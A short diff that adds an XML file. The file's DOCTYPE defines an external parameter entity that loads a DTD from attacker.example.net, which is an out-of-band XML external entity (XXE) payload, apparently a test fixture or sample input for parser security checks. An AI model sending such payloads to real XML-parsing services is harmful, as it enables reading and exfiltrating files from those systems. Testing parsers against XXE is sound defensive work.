@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://attacker.example.net/x.dtd"> %remote;]>
+<r>data</r>
